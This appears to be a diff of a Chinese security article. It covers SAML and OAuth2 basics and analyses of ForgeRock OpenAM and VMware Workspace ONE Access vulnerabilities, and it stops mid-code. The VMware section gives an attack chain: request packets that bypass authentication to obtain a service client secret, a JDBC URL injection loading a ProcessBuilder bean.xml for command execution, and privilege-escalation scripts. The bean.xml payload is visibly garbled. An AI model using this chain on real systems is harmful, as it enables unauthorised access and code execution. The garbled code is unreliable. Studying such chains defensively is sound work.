@@ -61,7 +61,7 @@ IAM 可以说是近年来攻击者的主要目标，它主要有以下几个特�
 
   
 
->   政策决策点（PDP）：PDP 做出访问控制决策。它通过检查访问控制策略来确定是否允许自适应应用程序执行请求的任务。
+>   政策决策点（PDP）：PDP 做出访问控制决策。它通过检查访问控制策略来确定是否允许自适应应用程序执行请求的任务。
 
   
 
@@ -91,7 +91,7 @@ IAM 可以说是近年来攻击者的主要目标，它主要有以下几个特�
 
 **身份认证 - SAML**  
 
-SAML 全称是安全断言标记语言（Security Assertion Markup Language）是一个基于 XML 的开源标准数据格式。用于在不同的安全域之间交换认证和数据授权。在 SAML 标准定义了身份提供者（IDP）和服务提供者（SP），这两者构成了前面所说的不同的安全域。 
+SAML 全称是安全断言标记语言（Security Assertion Markup Language）是一个基于 XML 的开源标准数据格式。用于在不同的安全域之间交换认证和数据授权。在 SAML 标准定义了身份提供者（IDP）和服务提供者（SP），这两者构成了前面所说的不同的安全域。 
 
   
 
@@ -117,7 +117,7 @@ SAML 解决的最重要的需求是 Web 端应用的单点登录（SSO）。
 
   
 
-**授权验证 -  OAuth2**
+**授权验证 -  OAuth2**
 
   
 
@@ -161,19 +161,19 @@ OAuth 2.0 共有 4 种访问模式：
 
 - 授权码模式 (Authorization Code)，适用于一般服务器端应用
 
-  授权码模式（authorization code）是功能最完整、流程最严密的授权模式。
+  授权码模式（authorization code）是功能最完整、流程最严密的授权模式。
 
 - 简化模式 (Implicit)，适用于纯网页端应用
 
-  简化模式是对授权码模式的简化，用于在浏览器中使用脚本语言如 JS 实现的客户端中，它的特点是不通过客户端应用程序的服务器，而是直接在浏览器中向认证服务器申请令牌，跳过了 “授权码临时凭证” 这个步骤。其所有的步骤都在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。
+  简化模式是对授权码模式的简化，用于在浏览器中使用脚本语言如 JS 实现的客户端中，它的特点是不通过客户端应用程序的服务器，而是直接在浏览器中向认证服务器申请令牌，跳过了 “授权码临时凭证” 这个步骤。其所有的步骤都在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。
 
 - 密码模式 (Resource owner password credentials)
 
-  在密码模式中，用户需要向客户端提供自己的用户名和密码，客户端使用这些信息向 “服务提供商” 索要授权。这相当于在豆瓣网中使用微信登录，我们需要在豆瓣网输入微信的用户名和密码，然后由豆瓣网使用我们的微信用户名和密码去向微信服务器获取授权信息。
+  在密码模式中，用户需要向客户端提供自己的用户名和密码，客户端使用这些信息向 “服务提供商” 索要授权。这相当于在豆瓣网中使用微信登录，我们需要在豆瓣网输入微信的用户名和密码，然后由豆瓣网使用我们的微信用户名和密码去向微信服务器获取授权信息。
 
 - 客户端模式 (Client credentials)
 
-  客户端模式是指客户端以自己的名义，而不是以用户的名义，向 “服务提供方” 进行认证。严格地说，客户端模式并不属于 OAuth2.0 协议所要解决的问题。在这种模式下，用户并不需要对客户端授权，用户直接向客户端注册，客户端以自己的名义要求 “服务提供商” 提供服务。
+  客户端模式是指客户端以自己的名义，而不是以用户的名义，向 “服务提供方” 进行认证。严格地说，客户端模式并不属于 OAuth2.0 协议所要解决的问题。在这种模式下，用户并不需要对客户端授权，用户直接向客户端注册，客户端以自己的名义要求 “服务提供商” 提供服务。
 
 用到最多的还是授权码模式，这里重点介绍下授权码模式。
 
@@ -208,9 +208,9 @@ A 步骤中，客户端申请认证的 URI，包含以下参数：
 下面是一个例子:
 
 ```
-GET /authorize?response_type=code&client_id=s6BhdRkqt3&state=xyz
-        &redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1
-Host: server.example.com
+GET /authorize?response_type=code&client_id=s6BhdRkqt3&state=xyz
+        &redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1
+Host: server.example.com
 ```
 
 D 步骤中，客户端向认证服务器申请令牌的 HTTP 请求，包含以下参数：
@@ -230,10 +230,10 @@ D 步骤中，客户端向认证服务器申请令牌的 HTTP 请求，包含以
 下面是一个例子
 
 ```
-POST /token HTTP/1.1
-Host: server.example.com
-Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
-Content-Type: application/x-www-form-urlencoded
+POST /token HTTP/1.1
+Host: server.example.com
+Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
+Content-Type: application/x-www-form-urlencoded
 
 grant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA
 &redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb
@@ -260,18 +260,18 @@ E 步骤中，认证服务器发送的 HTTP 回复，包含以下参数：
 下面是一个例子:
 
 ```
-HTTP/1.1 200 OK
-     Content-Type: application/json;charset=UTF-8
-     Cache-Control: no-store
-     Pragma: no-cache
+HTTP/1.1 200 OK
+     Content-Type: application/json;charset=UTF-8
+     Cache-Control: no-store
+     Pragma: no-cache
 
-     {
-       "access_token":"2YotnFZFEjr1zCsicMWpAA",
-       "token_type":"example",
-       "expires_in":3600,
-       "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA",
-       "example_parameter":"example_value"
-     }
+     {
+       "access_token":"2YotnFZFEjr1zCsicMWpAA",
+       "token_type":"example",
+       "expires_in":3600,
+       "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA",
+       "example_parameter":"example_value"
+     }
 
 
 ```
@@ -320,7 +320,7 @@ Oracle Access Manager 是 Oracle 公司的产品，并与 Oracle 的 Weblogic AS
 
   
 
- ForgeRock OpenAM 是美国 ForgeRock（Forgerock）公司的一套开源的单点登录框架（SSO）。该框架通过提供核心的标识服务（CoreServer）以实现在一个网络架构中的透明单点登录（如集中式、分布式的单点登录）。
+ ForgeRock OpenAM 是美国 ForgeRock（Forgerock）公司的一套开源的单点登录框架（SSO）。该框架通过提供核心的标识服务（CoreServer）以实现在一个网络架构中的透明单点登录（如集中式、分布式的单点登录）。
 
   
 
@@ -371,23 +371,23 @@ Oracle Access Manager 是 Oracle 公司的产品，并与 Oracle 的 Weblogic AS
 首先 ForgeRock 官网下载相关固件，然后解压 WAR 文件并反编译里面的所有 JAR，找到 jato-2005-05-04.jar 包，反编译后在 com/iplanet.jato/view / 下找到了 ViewBeanBase.class
 
 ```
-protected void deserializePageAttributes() {
-    if (!this.isPageSessionDeserialized()) {
-        RequestContext context = this.getRequestContext();
-        if (context == null) {
-            context = RequestManager.getRequestContext();
-        }
+protected void deserializePageAttributes() {
+    if (!this.isPageSessionDeserialized()) {
+        RequestContext context = this.getRequestContext();
+        if (context == null) {
+            context = RequestManager.getRequestContext();
+        }
 
-        String pageAttributesParam = context.getRequest().getParameter("jato.pageSession");
-        if (pageAttributesParam != null && pageAttributesParam.trim().length() > 0) {
-            try {           this.setPageSessionAttributes((Map)Encoder.deserialize(Encoder.decodeHttp64(pageAttributesParam), false));
-            } catch (Exception var4) {
-                this.handleDeserializePageAttributesException(var4);
-            }
-        }
+        String pageAttributesParam = context.getRequest().getParameter("jato.pageSession");
+        if (pageAttributesParam != null && pageAttributesParam.trim().length() > 0) {
+            try {           this.setPageSessionAttributes((Map)Encoder.deserialize(Encoder.decodeHttp64(pageAttributesParam), false));
+            } catch (Exception var4) {
+                this.handleDeserializePageAttributesException(var4);
+            }
+        }
 
-        this.setPageSessionDeserialized();
-    }
+        this.setPageSessionDeserialized();
+    }
 }
 
 
@@ -407,7 +407,7 @@ protected void deserializePageAttributes() {
 
 **(3) CVE-2020-4006 VMWare Workspace ONE Access 命令注入**
 
- 漏洞位于 /cfg/ssl/installSelfSignedCertificate TLS 端口 8443 上的 “Appliance Configurator” 服务中的端点中:
+ 漏洞位于 /cfg/ssl/installSelfSignedCertificate TLS 端口 8443 上的 “Appliance Configurator” 服务中的端点中:
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4IBQGI5c5Sicic4TicHWvTyMcVptniak6zxaLeiayasGXCmFztZszJWwOicjA/640?wx_fmt=png)
 
@@ -453,7 +453,7 @@ isValidSAN 方法内容如下：
 
   
 
-**3.2  CVE-2022-22954 漏洞挖掘过程**
+**3.2  CVE-2022-22954 漏洞挖掘过程**
 
 漏洞利用范围：
 
@@ -550,15 +550,15 @@ FreeMarker 是一款模板引擎，即一种基于模板和需要改变的数据
 首先是第一个漏洞，OAuth2TokenResourceController 访问控制服务 (ACS) 认证 bypass 漏洞，在 OAuth2TokenResourceController 类有两个可访问的路由，第一个路由会返回已存在的 oauth2 用户生成一个激活令牌 activationToken:
 
 ```
-@RequestMapping(value = {"/generateActivationToken/{id}"}, method = {RequestMethod.POST})
+@RequestMapping(value = {"/generateActivationToken/{id}"}, method = {RequestMethod.POST})
 @ResponseBody
-@ApiOperation(value = "Generate and update activation token for an existing oauth2 client", response = OAuth2ActivationTokenMedia.class)
-@ApiResponses({@ApiResponse(code = 500, message = "Generation failed, unknown error."), @ApiResponse(code = 400,message = "Generation failed, client is invalid or not specified.")})
-public OAuth2ActivationTokenMedia generateActivationToken(@ApiParam(value = "OAuth 2.0 Client identifier", example = "\"my-auth-grant-client1\"", required = true) @PathVariable("id") String clientId, HttpServletRequest request) throws MyOneLoginException {
- OrganizationRuntime orgRuntime = getOrgRuntime(request);
- OAuth2Client client = this.oAuth2ClientService.getOAuth2Client(orgRuntime.getOrganizationId().intValue(),clientId);
-if (client == null || client.getIdUser() == null) {
- throw new BadRequestException("invalid.client", new Object[0]);
+@ApiOperation(value = "Generate and update activation token for an existing oauth2 client", response = OAuth2ActivationTokenMedia.class)
+@ApiResponses({@ApiResponse(code = 500, message = "Generation failed, unknown error."), @ApiResponse(code = 400,message = "Generation failed, client is invalid or not specified.")})
+public OAuth2ActivationTokenMedia generateActivationToken(@ApiParam(value = "OAuth 2.0 Client identifier", example = "\"my-auth-grant-client1\"", required = true) @PathVariable("id") String clientId, HttpServletRequest request) throws MyOneLoginException {
+ OrganizationRuntime orgRuntime = getOrgRuntime(request);
+ OAuth2Client client = this.oAuth2ClientService.getOAuth2Client(orgRuntime.getOrganizationId().intValue(),clientId);
+if (client == null || client.getIdUser() == null) {
+ throw new BadRequestException("invalid.client", new Object[0]);
 }
 
 ```
@@ -566,25 +566,25 @@ if (client == null || client.getIdUser() == null) {
 第二个路由可以通过 activationToken 去激活 OAuth2 用户并且返回 client ID 和 client secret:  
 
 ```
-@RequestMapping(value = {"/activate"}, method = {RequestMethod.POST})
+@RequestMapping(value = {"/activate"}, method = {RequestMethod.POST})
 @ResponseBody
 @AllowExecutionWhenReadOnly
-@ApiOperation(value = "Activate the device client by exchanging an activation code for a client ID and client secret.", notes = "This endpoint is used in the dynamic mobile registration flow. The activation code is obtained by calling the /SAAS/auth/device/register endpoint. The client_secret and client_id returned in this call will be used in the call to the /SAAS/auth/oauthtoken endpoint.", response = OAuth2ClientActivationDetails.class)
-@ApiResponses({@ApiResponse(code = 500, message = "Activation failed, unknown error."), @ApiResponse(code = 404, message = "Activation failed, organization not found."), @ApiResponse(code = 400, message = "Activation failed, activation code is invalid or not specified.")})
-   public OAuth2ClientActivationDetails activateOauth2Client(@ApiParam(value = "the activation code", required = true) @RequestBody String activationCode, HttpServletRequest request) throws MyOneLoginException {
-     OrganizationRuntime organizationRuntime = getOrgRuntime(request);
-     try {
-       return this.activationTokenService.activateAndGetOAuth2Client(organizationRuntime.getOrganization(), activationCode);
-     } catch (EncryptionException e) {
-       throw new BadRequestException("invalid.activation.code", e, new Object[0]);
-     } catch (MyOneLoginException e) {
+@ApiOperation(value = "Activate the device client by exchanging an activation code for a client ID and client secret.", notes = "This endpoint is used in the dynamic mobile registration flow. The activation code is obtained by calling the /SAAS/auth/device/register endpoint. The client_secret and client_id returned in this call will be used in the call to the /SAAS/auth/oauthtoken endpoint.", response = OAuth2ClientActivationDetails.class)
+@ApiResponses({@ApiResponse(code = 500, message = "Activation failed, unknown error."), @ApiResponse(code = 404, message = "Activation failed, organization not found."), @ApiResponse(code = 400, message = "Activation failed, activation code is invalid or not specified.")})
+   public OAuth2ClientActivationDetails activateOauth2Client(@ApiParam(value = "the activation code", required = true) @RequestBody String activationCode, HttpServletRequest request) throws MyOneLoginException {
+     OrganizationRuntime organizationRuntime = getOrgRuntime(request);
+     try {
+       return this.activationTokenService.activateAndGetOAuth2Client(organizationRuntime.getOrganization(), activationCode);
+     } catch (EncryptionException e) {
+       throw new BadRequestException("invalid.activation.code", e, new Object[0]);
+     } catch (MyOneLoginException e) {
 
-       if (e.getCode() == 80480 || e.getCode() == 80476 || e.getCode() == 80440 || e.getCode() == 80558) {
-         throw new BadRequestException("invalid.activation.code", e, new Object[0]);
-       }
-       throw e;
-     } 
-   }
+       if (e.getCode() == 80480 || e.getCode() == 80476 || e.getCode() == 80440 || e.getCode() == 80558) {
+         throw new BadRequestException("invalid.activation.code", e, new Object[0]);
+       }
+       throw e;
+     } 
+   }
 
 ```
 
@@ -595,15 +595,15 @@ if (client == null || client.getIdUser() == null) {
 系统默认用户是在 com.vmware.horizon.rest.controller.system.BootstrapController 这个类中默认进行创建的：  
 
 ```
-public boolean createTenant(int orgId, String tenantId) {
-     try {
-    createDefaultServiceOAuth2Client(orgId);
-     } catch (Exception e) {
-       log.warn("Failed to create the default service oauth2 client for org " + tenantId, e);
-       return false;
-     }
-     return true;
-   }
+public boolean createTenant(int orgId, String tenantId) {
+     try {
+    createDefaultServiceOAuth2Client(orgId);
+     } catch (Exception e) {
+       log.warn("Failed to create the default service oauth2 client for org " + tenantId, e);
+       return false;
+     }
+     return true;
+   }
 
 
 ```
@@ -612,18 +612,18 @@ public boolean createTenant(int orgId, String tenantId) {
 
 ```
 @Nonnull
-   @Transactional(rollbackFor = {MyOneLoginException.class})
-   @ReadWriteConnection
-   public OAuth2Client createDefaultServiceOAuth2Client(int orgId) throws MyOneLoginException {
-     OAuth2Client oAuth2Client = this.oauth2ClientService.getOAuth2Client(orgId, "Service__OAuth2Client");
-     if (oAuth2Client == null) {
-       Organizations firstOrg = this.organizationService.getFirstOrganization();
-       if (firstOrg.getId().intValue() == orgId) {
-         log.info("Creating service_oauth2 client for root tenant.");
-         return createSystemScopedServiceOAuth2Client(firstOrg, "Service__OAuth2Client", null, "admin system"); 
-       }
-     return oAuth2Client;
-   }
+   @Transactional(rollbackFor = {MyOneLoginException.class})
+   @ReadWriteConnection
+   public OAuth2Client createDefaultServiceOAuth2Client(int orgId) throws MyOneLoginException {
+     OAuth2Client oAuth2Client = this.oauth2ClientService.getOAuth2Client(orgId, "Service__OAuth2Client");
+     if (oAuth2Client == null) {
+       Organizations firstOrg = this.organizationService.getFirstOrganization();
+       if (firstOrg.getId().intValue() == orgId) {
+         log.info("Creating service_oauth2 client for root tenant.");
+         return createSystemScopedServiceOAuth2Client(firstOrg, "Service__OAuth2Client", null, "admin system"); 
+       }
+     return oAuth2Client;
+   }
 
 
 
@@ -634,27 +634,27 @@ public boolean createTenant(int orgId, String tenantId) {
 在 com.vmware.horizon.rest.controller.system.DBConnectionCheckController 控制器类中有个名为 dbCheck 的公开方法：
 
 ```
-@RequestMapping(method = {RequestMethod.POST}, produces = {"application/json"})
-   @ProtectedApi(resource = "vrn:tnts:*", actions = {"tnts:read"})
-   @ResponseBody
-   public RESTResponse dbCheck(@RequestParam(value = "jdbcUrl", required = true) String jdbcUrl, @RequestParam(value = "dbUsername", required = true) String dbUsername, @RequestParam(value = "dbPassword", required = true) String dbPassword) throws MyOneLoginException {
-     String driverVersion;
-     try {
-       if (this.organizationService.countOrganizations() > 0L) { 
-         assureAuthenticatedApiAdmin(); 
-       }
-     } catch (Exception e) {
-       log.info("Check for existing organization threw an exception.", driverVersion);
-     }
+@RequestMapping(method = {RequestMethod.POST}, produces = {"application/json"})
+   @ProtectedApi(resource = "vrn:tnts:*", actions = {"tnts:read"})
+   @ResponseBody
+   public RESTResponse dbCheck(@RequestParam(value = "jdbcUrl", required = true) String jdbcUrl, @RequestParam(value = "dbUsername", required = true) String dbUsername, @RequestParam(value = "dbPassword", required = true) String dbPassword) throws MyOneLoginException {
+     String driverVersion;
+     try {
+       if (this.organizationService.countOrganizations() > 0L) { 
+         assureAuthenticatedApiAdmin(); 
+       }
+     } catch (Exception e) {
+       log.info("Check for existing organization threw an exception.", driverVersion);
+     }
 
-     try {
-       String encryptedPwd = configEncrypter.encrypt(dbPassword);
-       driverVersion = this.dbConnectionCheckService.checkConnection(jdbcUrl, dbUsername, encryptedPwd); 
-     } catch (PersistenceRuntimeException e) {
-       throw new MyOneLoginException(HttpStatus.NOT_ACCEPTABLE.value(), e.getMessage(), e);
-     }
-     return new RESTResponse(Boolean.valueOf(true), Integer.valueOf(HttpStatus.OK.value()), driverVersion, null);
-   }
+     try {
+       String encryptedPwd = configEncrypter.encrypt(dbPassword);
+       driverVersion = this.dbConnectionCheckService.checkConnection(jdbcUrl, dbUsername, encryptedPwd); 
+     } catch (PersistenceRuntimeException e) {
+       throw new MyOneLoginException(HttpStatus.NOT_ACCEPTABLE.value(), e.getMessage(), e);
+     }
+     return new RESTResponse(Boolean.valueOf(true), Integer.valueOf(HttpStatus.OK.value()), driverVersion, null);
+   }
 
 
 ```
@@ -664,29 +664,29 @@ public boolean createTenant(int orgId, String tenantId) {
 其中 jdbcUrl 可以看到是可控的，跟进这个方法查看：
 
 ```
-public String checkConnection(String jdbcUrl, String username, String password) throws PersistenceRuntimeException { return checkConnection(jdbcUrl, username, password, true); }
-   public String checkConnection(@Nonnull String jdbcUrl, @Nonnull String username, @Nonnull String password, boolean checkCreateTableAccess) throws PersistenceRuntimeException {
-     connection = null;
-     String driverVersion = null;
-     try {
-       loadDriver(jdbcUrl);
-       connection = testConnection(jdbcUrl, username, password, checkCreateTableAccess); 
-       meta = connection.getMetaData();
-       driverVersion = meta.getDriverVersion();
-     } catch (SQLException e) {
-       log.error("connectionFailed");
-       throw new PersistenceRuntimeException(e.getMessage(), e);
-     } finally {
-       try {
-         if (connection != null) {
-           connection.close();
-         }
-       } catch (Exception e) {
-         log.warn("Problem closing connection", e);
-       }
-     }
-     return driverVersion;
-   }
+public String checkConnection(String jdbcUrl, String username, String password) throws PersistenceRuntimeException { return checkConnection(jdbcUrl, username, password, true); }
+   public String checkConnection(@Nonnull String jdbcUrl, @Nonnull String username, @Nonnull String password, boolean checkCreateTableAccess) throws PersistenceRuntimeException {
+     connection = null;
+     String driverVersion = null;
+     try {
+       loadDriver(jdbcUrl);
+       connection = testConnection(jdbcUrl, username, password, checkCreateTableAccess); 
+       meta = connection.getMetaData();
+       driverVersion = meta.getDriverVersion();
+     } catch (SQLException e) {
+       log.error("connectionFailed");
+       throw new PersistenceRuntimeException(e.getMessage(), e);
+     } finally {
+       try {
+         if (connection != null) {
+           connection.close();
+         }
+       } catch (Exception e) {
+         log.warn("Problem closing connection", e);
+       }
+     }
+     return driverVersion;
+   }
 
 
 ```
@@ -694,17 +694,17 @@ public String checkConnection(String jdbcUrl, String username, String pas
 接着可控的 jdbcUrl 将作为参数传入 testConnection 方法进行调用，跟进:  
 
 ```
-private Connection testConnection(String jdbcUrl, String username, String password, boolean checkCreateTableAccess) throws PersistenceRuntimeException {
-     try {
-       Connection connection = this.factoryHelper.getConnection(jdbcUrl, username, password); 
-       log.info("sql verification triggered");
-       this.factoryHelper.sqlVerification(connection, username, Boolean.valueOf(checkCreateTableAccess));
+private Connection testConnection(String jdbcUrl, String username, String password, boolean checkCreateTableAccess) throws PersistenceRuntimeException {
+     try {
+       Connection connection = this.factoryHelper.getConnection(jdbcUrl, username, password); 
+       log.info("sql verification triggered");
+       this.factoryHelper.sqlVerification(connection, username, Boolean.valueOf(checkCreateTableAccess));
 
-       if (checkCreateTableAccess) {
-         return testCreateTableAccess(jdbcUrl, connection);
-       }
-       return testUpdateTableAccess(connection);
-     }
+       if (checkCreateTableAccess) {
+         return testCreateTableAccess(jdbcUrl, connection);
+       }
+       return testUpdateTableAccess(connection);
+     }
 
 
 ```
@@ -712,18 +712,18 @@ private Connection testConnection(String jdbcUrl, String username, String�
 然后同样作为参数调用了 FactoryHelper.getConnection() 方法，跟进：  
 
 ```
-public Connection getConnection(String jdbcUrl, String username, String password) throws SQLException {
-       try {
-         return DriverManager.getConnection(jdbcUrl, username, password); 
-       } catch (Exception ex) {
-         if (ex.getCause() != null && ex.getCause().toString().contains("javax.net.ssl.SSLHandshakeException")) {
-           log.info(String.format("ssl handshake failed for the user:%s ", new Object[] { username }));
-           throw new SQLException("database.connection.ssl.notSuccess");
-         }
-         log.info(String.format("Connection failed for the user:%s ", new Object[] { username }));
-         throw new SQLException("database.connection.notSuccess");
-       }
-     }
+public Connection getConnection(String jdbcUrl, String username, String password) throws SQLException {
+       try {
+         return DriverManager.getConnection(jdbcUrl, username, password); 
+       } catch (Exception ex) {
+         if (ex.getCause() != null && ex.getCause().toString().contains("javax.net.ssl.SSLHandshakeException")) {
+           log.info(String.format("ssl handshake failed for the user:%s ", new Object[] { username }));
+           throw new SQLException("database.connection.ssl.notSuccess");
+         }
+         log.info(String.format("Connection failed for the user:%s ", new Object[] { username }));
+         throw new SQLException("database.connection.notSuccess");
+       }
+     }
 
 
 ```
@@ -749,14 +749,14 @@ sudo -l 列出当前用户可以执行的命令:
 ```
 #!/bin/sh
 
-#Script to isolate sudo access to just publishing a single file to the trusted certs directory
+#Script to isolate sudo access to just publishing a single file to the trusted certs directory
 
 CERTFILE=$1
-DESTFILE=$(basename $2)
+DESTFILE=$(basename $2)
 
-cp -f $CERTFILE /etc/ssl/certs/$DESTFILE // 1
-chmod 644 /etc/ssl/certs/$DESTFILE // 2
-c_rehash > /dev/null
+cp -f $CERTFILE /etc/ssl/certs/$DESTFILE // 1
+chmod 644 /etc/ssl/certs/$DESTFILE // 2
+c_rehash > /dev/null
 
 
 ```
@@ -768,27 +768,27 @@ c_rehash > /dev/null
 ```
 #!/bin/bash
 #
-# Minor: Copyright 2019 VMware, Inc. All rights reserved.
-. /usr/local/horizon/scripts/hzn-bin.inc
-. /usr/local/horizon/scripts/manageTcCfg.inc
+# Minor: Copyright 2019 VMware, Inc. All rights reserved.
+. /usr/local/horizon/scripts/hzn-bin.inc
+. /usr/local/horizon/scripts/manageTcCfg.inc
 DEBUG_FILE=$1
 
 #...
 
-function gatherConfig()
+function gatherConfig()
 {
-    printLines
-    echo "1) cat /usr/local/horizon/conf/flags/sysconfig.hostname" > ${DEBUG_FILE}
-    #...
-    chown $TOMCAT_USER:$TOMCAT_GROUP $DEBUG_FILE 
+    printLines
+    echo "1) cat /usr/local/horizon/conf/flags/sysconfig.hostname" > ${DEBUG_FILE}
+    #...
+    chown $TOMCAT_USER:$TOMCAT_GROUP $DEBUG_FILE 
 }
 
-if [ -z "$DEBUG_FILE" ]
+if [ -z "$DEBUG_FILE" ]
 then
-    usage
+    usage
 else
-    DEBUG_FILE=${DEBUG_FILE}/"debugConfig.txt"
-    gatherConfig
+    DEBUG_FILE=${DEBUG_FILE}/"debugConfig.txt"
+    gatherConfig
 fi
 
 
@@ -805,10 +805,10 @@ fi
 请求包：
 
 ```
-POST /SAAS/API/1.0/REST/oauth2/generateActivationToken/Service__OAuth2Client HTTP/1.1
-Host: photon-machine
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 0
+POST /SAAS/API/1.0/REST/oauth2/generateActivationToken/Service__OAuth2Client HTTP/1.1
+Host: photon-machine
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
 
 
 ```
@@ -817,8 +817,8 @@ Content-Length: 0
 
 ```
 {
- "activationToken": "eyJvdGEiOiJiNmRlZmFkOS1iY2M3LTM3ZWUtYTdkZi05YTM2ZDcxZDU4MGE6c0dJcnlObEhxREVnUW...",
- "_links": {}
+ "activationToken": "eyJvdGEiOiJiNmRlZmFkOS1iY2M3LTM3ZWUtYTdkZi05YTM2ZDcxZDU4MGE6c0dJcnlObEhxREVnUW...",
+ "_links": {}
 }
 
 
@@ -829,10 +829,10 @@ Content-Length: 0
 请求包：
 
 ```
-POST /SAAS/API/1.0/REST/oauth2/activate HTTP/1.1
-Host: photon-machine
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 168
+POST /SAAS/API/1.0/REST/oauth2/activate HTTP/1.1
+Host: photon-machine
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 168
 
 eyJvdGEiOiJiNmRlZmFkOS1iY2M3LTM3ZWUtYTdkZi05YTM2ZDcxZDU4MGE6c0dJcnlObEhxREVnUW...
 
@@ -843,8 +843,8 @@ eyJvdGEiOiJiNmRlZmFkOS1iY2M3LTM3ZWUtYTdkZi05YTM2ZDcxZDU4MGE6c0dJcnlObEhxREVnUW..
 
 ```
 {
- "client_id": "Service__OAuth2Client",
- "client_secret": "uYkAzg1woC1qbCa3Qqd0i6UXpwa1q00o"
+ "client_id": "Service__OAuth2Client",
+ "client_secret": "uYkAzg1woC1qbCa3Qqd0i6UXpwa1q00o"
 }
 
 ```
@@ -860,10 +860,10 @@ eyJvdGEiOiJiNmRlZmFkOS1iY2M3LTM3ZWUtYTdkZi05YTM2ZDcxZDU4MGE6c0dJcnlObEhxREVnUW..
 bean.xml:
 
 ```
-<beans xnlns="http://www.springframework.ar9/schema/beans"
-xnlns:xsi="http://www.w3.0rg/2001/XMLSchema- iristance"
-xsi:schenaLocat ion="http://www.springfiremefork.org/schema /beans http://www.Springframework.org/schema/beans /spring-beans.xsd">
-<bean id="pb" class="Java.Lang.ProcessButlder" init-method="start">
+<beans xnlns="http://www.springframework.ar9/schema/beans"
+xnlns:xsi="http://www.w3.0rg/2001/XMLSchema- iristance"
+xsi:schenaLocat ion="http://www.springfiremefork.org/schema /beans http://www.Springframework.org/schema/beans /spring-beans.xsd">
+<bean id="pb" class="Java.Lang.ProcessButlder" init-method="start">
 <constructor-arg>
 <list>
 svalue>touch</value>
@@ -887,16 +887,16 @@ jdbc:postgresql://si/saas?&socketFactory=org.springframework.context.support.Fil
 当然样的话就比较受出网限制，如果目标没法出网的情况下，还得思考下如何进一步改进利用，这里用到了 com.vmware.licensecheck.LicenseChecker 这个类：  
 
 ```
-public LicenseChecker(final String s) {
-        this(s, true);
-    }
-    public LicenseChecker(final String state, final boolean validateExpiration) {
-        this._handle = new LicenseHandle();
-        if (state != null) {
-            this._handle.setState(state); 
-        }
-        this._validateExpiration = validateExpiration;
-    }
+public LicenseChecker(final String s) {
+        this(s, true);
+    }
+    public LicenseChecker(final String state, final boolean validateExpiration) {
+        this._handle = new LicenseHandle();
+        if (state != null) {
+            this._handle.setState(state); 
+        }
+        this._validateExpiration = validateExpiration;
+    }
 
 
 ```
@@ -904,20 +904,20 @@ public LicenseChecker(final String s) {
 LicenseChecker 的构造函数会调用另外一个重载构造函数 LicenseChecker(final String state, final boolean validateExpiration), 其中会调用到 LicuseHandle 类上的 setState：  
 
 ```
- public void setState(String var1) {
-        if (var1 != null && var1.length() >= 1) {
-            try {
-                byte[] var2 = MyBase64.decode(var1); // 3
-                if (var2 != null && this.deserialize(var2)) { // 4
-                    this._state = var1;
-                    this._isDirty = false;
-                }
-            } catch (Exception var3) {
-                log.debug(new Object[]{"failed to decode state: " + var3.getMessage()});
-            }
+ public void setState(String var1) {
+        if (var1 != null && var1.length() >= 1) {
+            try {
+                byte[] var2 = MyBase64.decode(var1); // 3
+                if (var2 != null && this.deserialize(var2)) { // 4
+                    this._state = var1;
+                    this._isDirty = false;
+                }
+            } catch (Exception var3) {
+                log.debug(new Object[]{"failed to decode state: " + var3.getMessage()});
+            }
 
-        }
-    }
+        }
+    }
 
 
 ```
@@ -925,26 +925,26 @@ LicenseChecker 的构造函数会调用另外一个重载构造函数 LicenseChe
 然后回对传入的可控参数先进行 base64 解码，然后调用了 deserialize，跟进查看：  
 
 ```
-private boolean deserialize(byte[] var1) {
-        if (var1 == null) {
-            return true;
-        } else {
-            try {
-                ByteArrayInputStream var2 = new ByteArrayInputStream(var1);
-                DataInputStream var3 = new DataInputStream(var2);
-                int var4 = var3.readInt();
-                switch(var4) {
-                case -889267490:
-                    return this.deserialize_v2(var3); 
-                default:
-                    log.debug(new Object[]{"bad magic: " + var4});
-                }
-            } catch (Exception var5) {
-                log.debug(new Object[]{"failed to de-serialize handle: " + var5.getMessage()});
-            }
-            return false;
-        }
-    }
+private boolean deserialize(byte[] var1) {
+        if (var1 == null) {
+            return true;
+        } else {
+            try {
+                ByteArrayInputStream var2 = new ByteArrayInputStream(var1);
+                DataInputStream var3 = new DataInputStream(var2);
+                int var4 = var3.readInt();
+                switch(var4) {
+                case -889267490:
+                    return this.deserialize_v2(var3); 
+                default:
+                    log.debug(new Object[]{"bad magic: " + var4});
+                }
+            } catch (Exception var5) {
+                log.debug(new Object[]{"failed to de-serialize handle: " + var5.getMessage()});
+            }
+            return false;
+        }
+    }
 
 
 ```
@@ -952,30 +952,30 @@ private boolean deserialize(byte[] var1) {
 这里读取 base64 解码后的字节的的一个 int，如果为 - 889267490 的话继续调用 deserialize_v2 方法：  
 
 ```
-private boolean deserialize_v2(DataInputStream var1) throws IOException {
-        byte[] var2 = Encrypt.readByteArray(var1);
-        if (var2 == null) {
-            log.debug(new Object[]{"failed to read cipherText"});
-            return false;
-        } else {
-            try {
-                byte[] var3 = Encrypt.decrypt(var2, new String(keyBytes_v2)); 
-                if (var3 == null) {
-                    log.debug(new Object[]{"failed to decrypt state data"});
-                    return false;
-                } else {
-                    ByteArrayInputStream var4 = new ByteArrayInputStream(var3);
-                    ObjectInputStream var5 = new ObjectInputStream(var4);
-                    this._htEvalStart = (Hashtable)var5.readObject(); 
-                    log.debug(new Object[]{"restored " + this._htEvalStart.size() + " entries from state info"});
-                    return true;
-                }
-            } catch (Exception var6) {
-                log.warn(new Object[]{var6.getMessage()});
-                return false;
-            }
-        }
-    }
+private boolean deserialize_v2(DataInputStream var1) throws IOException {
